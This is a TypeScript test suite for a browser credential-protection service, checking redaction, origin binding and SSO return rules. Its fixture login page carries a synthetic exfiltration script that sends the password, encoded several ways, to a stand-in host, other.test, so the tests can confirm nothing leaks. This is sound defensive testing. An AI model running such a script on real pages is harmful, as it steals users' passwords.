import {requireProtectedForm,type ProtectedFormControl,type ProtectedLoginReply} from "../lib/protected-login-contract";
function controlMatching(reply:ProtectedLoginReply,predicate:(control:ProtectedFormControl)=>boolean){const control=requireProtectedForm(reply).controls.find(predicate);assert(control,"Expected protected form control");return control;}
function controlById(reply:ProtectedLoginReply,id:string){return controlMatching(reply,control=>control.id===id);}
import {requireProtectedInput} from "../lib/protected-login-contract";
import test, { type TestContext } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import http from "node:http";
import https from "node:https";
import net from "node:net";
import { execFileSync } from "node:child_process";
import { randomBytes } from "node:crypto";
import { SavedBrowserLogins } from "../services/browser-login/core";

const origin = "https://portal.test";
const fields = ["username", "password"];
const selectors = { fields, usernameSelector: "#username2", selector: "#password" };

async function fixture(t: TestContext, operatorReturns: Record<string, string[]> = {}) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "metis-login-preflight-"));
  const keyFile = path.join(dir, "key.pem"), certFile = path.join(dir, "cert.pem");
  execFileSync("openssl", ["req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", keyFile, "-out", certFile, "-days", "1", "-subj", "/CN=portal.test"], { stdio: "ignore" });
  let credentialInputEvents = 0, credentialLeaks = 0;
  const credentialPosts: Array<{host:string;body:string}> = [];
  const login = (action = "/authenticated", extra = "") => `<form method="post" action="${action}">
    <input id="username2" name="username" autocomplete="username">
    ${extra}<input id="password" name="password" type="password">
    <button id="submit">Login</button>
  </form><button id="attempt-credential-leaks" onclick="const password=document.querySelector('#password').value;const values=[password,encodeURIComponent(password),btoa(password),Array.from(password).map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('')];Promise.allSettled(values.flatMap(value=>[fetch('https://other.test/credential-leak?value='+value),fetch('https://other.test/credential-leak',{method:'POST',body:value})])).then(()=>document.body.insertAdjacentHTML('beforeend','<p id=credential-leaks-finished>Finished</p>'))">Attempt synthetic leaks</button><script>for (const field of document.querySelectorAll('input')) field.addEventListener('input', () => fetch('/field-input', {method:'POST'}));</script>`;
  const portal = https.createServer({ key: fs.readFileSync(keyFile), cert: fs.readFileSync(certFile) }, async (req, res) => {
    if (req.url?.startsWith("/credential-leak") && req.headers.host === "other.test") { credentialLeaks++; res.writeHead(204); res.end(); return; }
    if (req.url === "/field-input") { credentialInputEvents++; res.writeHead(204); res.end(); return; }
    res.setHeader("Content-Type", "text/html");
    const pathname = new URL(req.url || "/", origin).pathname;
    if (req.method === "POST") {
      let body=""; for await (const chunk of req) body+=chunk;
      credentialPosts.push({host:req.headers.host||"",body});
    }
    if (pathname === "/public-redirect") {
      res.writeHead(302, { Location: "https://other.test/login" }); res.end();
    } else if (pathname === "/sso-task") {
      res.end('<h1>Authenticated task</h1><script src="/task-menu.js"></script>');
    } else if (pathname === "/task-menu.js") {
      res.setHeader("Content-Type", "application/javascript");
      res.end("fetch('/task-menu-data').then(r=>r.json()).then(data=>document.body.insertAdjacentHTML('beforeend','<p id=task-menu-ready>'+data.label+'</p>'))");
    } else if (pathname === "/task-menu-data") {
      res.setHeader("Content-Type", "application/json");
      res.end(JSON.stringify({ label: "Configured task menu ready" }));
    } else if (pathname === "/choose") {
      res.end(`<h1>Select campus</h1>
        <select id="school"><option value="">Choose</option><option value="campus-a">Test campus A</option></select>
        <button onclick="if(document.querySelector('#school').value)location.href='/login?campus='+document.querySelector('#school').value">Continue</button>
        <div hidden id="login-fields">${login()}</div>`);
    } else if (pathname === "/delayed") {
      res.end(`<div hidden id="login-fields">${login()}</div><script>setTimeout(() => document.querySelector('#login-fields').hidden=false, 250)</script>`);
    } else if (pathname === "/ambiguous") {
      res.end(login("/authenticated", '<input name="alternate" autocomplete="username" class="alternate">'));
    } else if (pathname === "/unsafe") {
      res.end(login("https://other.test/authenticated"));
    } else {
      const selectedCampus = new URL(req.url || "/", origin).searchParams.get("campus");
      res.end((selectedCampus === "campus-b" ? "<p>Test campus B selected</p>" : "") + login());
    }
  });
  await new Promise<void>(resolve => portal.listen(0, "127.0.0.1", resolve));
  const port = (portal.address() as net.AddressInfo).port;
  const sockets = new Set<net.Socket>();
  const proxy = http.createServer();
  proxy.on("connect", (req, client, head) => {
    const incoming = client as net.Socket;
    sockets.add(incoming); incoming.on("close", () => sockets.delete(incoming));
    if (!["portal.test:443","other.test:443","task.test:443"].includes(req.url || "")) { incoming.destroy(); return; }
    const upstream = net.connect(port, "127.0.0.1", () => {
      incoming.write("HTTP/1.1 200 Connection Established\r\n\r\n");
      if (head.length) upstream.write(head);
      incoming.pipe(upstream); upstream.pipe(incoming);
    });
    upstream.on("error", () => incoming.destroy());
    incoming.on("error", () => upstream.destroy());
    incoming.on("close", () => upstream.destroy());
  });
  await new Promise<void>(resolve => proxy.listen(0, "127.0.0.1", resolve));
  const core = new SavedBrowserLogins(randomBytes(32), path.join(dir, "logins.sqlite"), `http://127.0.0.1:${(proxy.address() as net.AddressInfo).port}`, operatorReturns);
  t.after(async () => {
    await core.close();
    for (const socket of sockets) socket.destroy();
    await new Promise<void>(resolve => proxy.close(() => resolve()));
    await new Promise<void>(resolve => portal.close(() => resolve()));
    fs.rmSync(dir, { recursive: true, force: true });
  });
  const call = (operation: string, input: Record<string, unknown> = {}, management = false, owner = "test-owner", chat = "test-chat") =>
    core.dispatch({ owner, chat, operation, input }, management);
  return { call, inputEvents: () => credentialInputEvents, credentialLeaks: () => credentialLeaks, credentialPosts };
}

test("protected login preflight keeps school selection and credentials in the private context", async t => {
  const { call } = await fixture(t);
  const chooser = await call("prepare", { url: `${origin}/choose`, ...selectors });
  assert.equal(chooser.status, "protected_browser_ready");
  assert.equal(chooser.code, "credential_fields_not_visible");
  assert.deepEqual([...(chooser.missingFields ?? [])].sort(), [...fields].sort());
  assert.equal(chooser.secureInput, undefined);

  const before = await call("action", { action: "form_state" });
  assert.equal(controlById(before, "username2").visible, false);
  assert.equal(controlById(before, "password").visible, false);
  const school = controlById(before, "school");
  assert.equal(school.visible, true);
  const campus = school.options?.find((option: { text: string }) => option.text === "Test campus A");
  assert(campus && !campus.disabled);
  const continueButton = controlMatching(before, (control: { tag: string; label: string; visible: boolean }) => control.tag === "button" && control.label === "Continue" && control.visible);
  assert(continueButton?.selector, "No-ID chooser controls must have a usable selector");
  await call("action", { action: "select_option", selector: school.selector, value: campus.value });
  await call("action", { action: "click", selector: continueButton.selector });
  const selected = await call("action", { action: "form_state" });
  assert.equal(controlById(selected, "username2").visible, true);
  assert.equal(new URL(selected.url ?? "").pathname, "/login");

  // The ordinary browser can still be at /choose. Preparing again must keep
  // private school selection instead of reloading that stale handoff URL.
  const prepared = await call("prepare", { url: `${origin}/choose`, ...selectors });
  assert.equal(prepared.status, "input_required");
  assert.deepEqual(requireProtectedInput(prepared).fields, fields);
  assert.equal(requireProtectedInput(prepared).origin, origin);
  // These isolated fixture credentials intentionally collide with raw field
  // IDs/types to exercise redaction without breaking safe generated references.
  const identity = { username: "username2", password: "password" };
  const usernameIndex = controlById(selected, "username2").index;
  const passwordIndex = controlById(selected, "password").index;
  await assert.rejects(call("fill", { requestId: requireProtectedInput(prepared).requestId, ...identity }, true, "other-owner"));
  await assert.rejects(call("fill", { requestId: requireProtectedInput(prepared).requestId, ...identity }, true, "test-owner", "other-chat"));
  assert.equal((await call("fill", { requestId: requireProtectedInput(prepared).requestId, ...identity, persist: false }, true)).status, "filled_for_chat");
  const filled = await call("action", { action: "form_state" });
  assert.equal(new URL(filled.url ?? "").pathname, "/login");
  for (const secret of Object.values(identity)) assert(!JSON.stringify(filled).includes(secret));
  const usernameControl = controlMatching(filled, (control: { index: number }) => control.index === usernameIndex);
  const passwordControl = controlMatching(filled, (control: { index: number }) => control.index === passwordIndex);
  assert.equal(usernameControl.id, "[REDACTED]");
  assert.equal(passwordControl.id, "[REDACTED]");
  for (const control of [usernameControl, passwordControl]) {
    assert(control.selector && !control.selector.includes("[REDACTED]"));
    await call("action", { action: "wait_for", selector: control.selector });
  }
  const retry = await call("prepare", { fields, usernameSelector: usernameControl.selector, selector: passwordControl.selector, replace: true });
  assert.equal(retry.status, "input_required");
});

test("protected login waits for dynamically displayed credential fields", async t => {
  const { call } = await fixture(t);
  const prepared = await call("prepare", { url: `${origin}/delayed`, ...selectors });
  assert.equal(prepared.status, "input_required");
  assert.deepEqual(requireProtectedInput(prepared).fields, fields);
});

test("private school selection can also be corrected through explicit same-origin navigation", async t => {
  const { call } = await fixture(t);
  assert.equal((await call("prepare", { url: `${origin}/choose`, ...selectors })).status, "protected_browser_ready");
  await call("action", { action: "navigate", url: `${origin}/login?campus=campus-b` });
  const prepared = await call("prepare", { url: `${origin}/choose`, ...selectors });
  assert.equal(prepared.status, "input_required");
  const state = await call("action", { action: "form_state" });
  assert.equal(new URL(state.url ?? "").pathname, "/login");
  // Protected state deliberately strips URL queries; prove the selected
  // campus through a public DOM marker instead.
  assert(requireProtectedForm(state).text.includes("Test campus B selected"));
  await assert.rejects(call("action", { action: "navigate", url: "https://other.test/login" }));
});

test("hidden credential fields never trigger saved-credential reuse before school selection", async t => {
  const { call, inputEvents } = await fixture(t);
  const identity = { username: "TEST-SAVED-PREFLIGHT-USER", password: "TEST-SAVED-PREFLIGHT-PASSWORD" };
  const initial = await call("prepare", { url: `${origin}/login`, ...selectors });
  await call("fill", { requestId: requireProtectedInput(initial).requestId, ...identity, persist: true }, true);
  await call("close");
  const eventsBefore = inputEvents();
  const chooser = await call("prepare", { url: `${origin}/choose`, ...selectors });
  assert.equal(chooser.status, "protected_browser_ready");
  assert.equal(chooser.code, "credential_fields_not_visible");
  assert.equal(chooser.secureInput, undefined);
  assert.equal(inputEvents(), eventsBefore);
  const form = await call("action", { action: "form_state" });
  assert.equal(controlById(form, "username2").value, "");
  const school = controlById(form, "school");
  const campus = school.options?.find((option: { text: string }) => option.text === "Test campus A");
  assert(campus && !campus.disabled);
  const continueButton = controlMatching(form, (control: { tag: string; label: string }) => control.tag === "button" && control.label === "Continue");
  assert(continueButton?.selector);
  await call("action", { action: "select_option", selector: school.selector, value: campus.value });
  await call("action", { action: "click", selector: continueButton.selector });
  const prepared = await call("prepare", { url: `${origin}/choose`, ...selectors });
  assert.equal(prepared.status, "filled_saved");
  for (const secret of Object.values(identity)) assert(!JSON.stringify(prepared).includes(secret));
});

test("ambiguous and unsafe fields remain errors rather than preceding-step readiness", async t => {
  const { call } = await fixture(t);
  await assert.rejects(
    call("prepare", { url: `${origin}/ambiguous`, fields, selector: "#password", usernameSelector: 'input[autocomplete="username"]' }),
    (error: unknown) => error instanceof Error && "code" in error && error.code === "field_ambiguous",
  );
  await call("close");
  await assert.rejects(
    // Declaring a return origin permits SSO assertions, never a credential form
    // that posts the password directly to that other origin.
    call("prepare", { url: `${origin}/unsafe?return_url=${encodeURIComponent("https://other.test/")}`, ...selectors }),
    (error: unknown) => error instanceof Error && "code" in error && error.code === "unsafe_target",
  );
});


test("operator return grants allow fresh task assets without granting credentials or mutable trust", async t => {
  const operatorReturns={"https://portal.test":["https://other.test"]};
  const {call,credentialLeaks}=await fixture(t,operatorReturns);
  operatorReturns[origin].push("https://later.test"); // mutation cannot change this service snapshot
  const prepared=await call("prepare",{url:`${origin}/login`,...selectors});
  const identity={username:"SYNTHETIC-CONFIGURED-USER",password:"SYNTHETIC-CONFIGURED-PASSWORD:/+"};
  await assert.rejects(call("fill",{requestId:requireProtectedInput(prepared).requestId,...identity},true,"other-owner"));
  await assert.rejects(call("fill",{requestId:requireProtectedInput(prepared).requestId,...identity},true,"test-owner","other-chat"));
  await call("fill",{requestId:requireProtectedInput(prepared).requestId,...identity,persist:true},true);
  await call("action",{action:"click",selector:"#attempt-credential-leaks"});
  await call("action",{action:"wait_for",selector:"#credential-leaks-finished"});
  assert.equal(credentialLeaks(),0,"configured return origins must never receive raw or encoded passwords");
  await call("action",{action:"navigate",url:"https://other.test/sso-task"});
  await call("action",{action:"wait_for",selector:"#task-menu-ready"});
  const task=await call("action",{action:"extract_text"});
  assert.equal(task.url,"https://other.test/sso-task");
  assert(task.snapshot?.includes("Configured task menu ready"));
  for(const value of Object.values(identity))assert(!JSON.stringify(task).includes(value));
  await assert.rejects(call("action",{action:"navigate",url:"https://later.test/"}));
  await call("close");
  const own=await call("prepare",{url:`${origin}/login`,...selectors});
  assert.equal(own.status,"filled_saved");
  await assert.rejects(call("action",{action:"navigate",url:"https://later.test/"}));
  await call("close");
  const returned=await call("prepare",{url:"https://other.test/login",...selectors});
  assert.equal(returned.status,"input_required","a navigation grant cannot reuse another origin's credentials");
});

test("MCP input and a public redirect cannot grant another credential origin's configured returns",async t=>{
  const {call}=await fixture(t,{[origin]:["https://task.test"]});
  const prepared=await call("prepare",{url:`${origin}/public-redirect`,...selectors,operatorReturnOrigins:{"https://other.test":["https://task.test"]},navigationOrigins:["https://task.test"]});
  assert.equal(requireProtectedInput(prepared).origin,"https://other.test");
  await assert.rejects(call("action",{action:"navigate",url:"https://task.test/"}));
});

test("unconfigured task origins remain unavailable after protected fill",async t=>{
  const {call}=await fixture(t);
  const prepared=await call("prepare",{url:`${origin}/login`,...selectors,returnOrigins:["https://other.test"]});
  await call("fill",{requestId:requireProtectedInput(prepared).requestId,username:"SYNTHETIC-DENIED-USER",password:"SYNTHETIC-DENIED-PASSWORD"},true);
  await assert.rejects(call("action",{action:"navigate",url:"https://other.test/sso-task"}));
});


test("a public redirect binds actual credential origin and that origin's configured task return",async t=>{
  const {call,credentialPosts}=await fixture(t,{"https://other.test":["https://task.test"]});
  const prepared=await call("prepare",{url:`${origin}/public-redirect`,...selectors});
  assert.equal(requireProtectedInput(prepared).origin,"https://other.test");
  const password="SYNTHETIC-REDIRECTED-CREDENTIAL";
  await call("fill",{requestId:requireProtectedInput(prepared).requestId,username:"SYNTHETIC-USER",password},true);
  await call("action",{action:"click",selector:"#submit"});
  assert.equal(credentialPosts.length,1);
  assert.equal(credentialPosts[0].host,"other.test");
  assert.equal(new URLSearchParams(credentialPosts[0].body).get("password"),password);
  await call("action",{action:"navigate",url:"https://task.test/sso-task"});
  await call("action",{action:"wait_for",selector:"#task-menu-ready"});
});
